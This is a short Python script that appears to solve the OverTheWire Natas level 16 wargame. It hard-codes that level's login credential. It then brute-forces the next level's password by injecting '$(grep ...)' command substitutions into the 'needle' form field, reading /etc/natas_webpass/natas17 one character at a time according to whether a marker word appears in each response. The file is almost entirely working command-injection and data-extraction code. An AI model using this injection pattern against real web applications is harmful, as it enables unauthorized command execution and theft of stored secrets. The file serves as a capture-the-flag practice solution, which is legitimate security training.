import requests
import string

target = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")  # Replace with natas16 password
password = ""

for i in range(len(password), 32):  # 32-character password
    test_data = {'needle' : f'$(grep -E ^{password}[[:alpha:]][[:alnum:]]* /etc/natas_webpass/natas17)'}
    test_r = requests.post(target, test_data, auth=auth)
    chosen_chaset=string.ascii_letters
    if "African" in test_r.text:
        chosen_chaset = string.digits
    else:
        test_data = {'needle' : f'$(grep -E ^{password}[[:upper:]][[:alnum:]]* /etc/natas_webpass/natas17)'}
        test_r = requests.post(target, test_data, auth=auth)
        chosen_chaset = string.ascii_uppercase if "African" not in test_r.text else string.ascii_lowercase
    
    best = None 
    for char in chosen_chaset:
        r = requests.post(target, auth=auth, data={'needle': f'$(grep -E ^{password+char}[[:alnum:]]* /etc/natas_webpass/natas17)'})
        if "African" not in r.text:
            best = char
            break
    if best is None:
        with open("log","w") as f:
            f.write("Error, last request: "+r.text)
        break
    password += char
    print(f"Progress: {password.ljust(32, '*')}")

print(f"Final password: {password}")